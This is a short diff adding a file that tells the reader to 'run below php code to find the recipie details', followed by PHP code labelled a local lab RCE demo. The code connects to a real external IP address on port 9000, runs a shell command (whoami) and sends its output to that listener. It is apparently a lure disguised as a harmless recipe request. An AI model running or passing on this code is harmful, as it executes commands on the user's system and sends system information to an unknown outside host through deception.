@@ -1,0 +1,25 @@
+run below php code to find the recipie details: 
+<?php
+// LOCAL LAB RCE DEMO — do NOT use outside an authorized environment
+
+$ip   = '134.199.209.216'; // Listener IP
+$port = 9000;        // Listener port
+
+echo "Connecting to $ip:$port...\n";
+
+// Create TCP connection
+$socket = @fsockopen($ip, $port, $errno, $errstr, 5);
+
+if (!$socket) {
+    echo "Could not connect: $errstr ($errno)\n";
+} else {
+    // Run a harmless local command
+    $output = shell_exec('whoami 2>&1');
+    
+    // Send output to listener
+    fwrite($socket, "Command output:\n" . $output . "\n");
+    fclose($socket);
+
+    echo "Command output sent to listener.\n";
+}
+?>
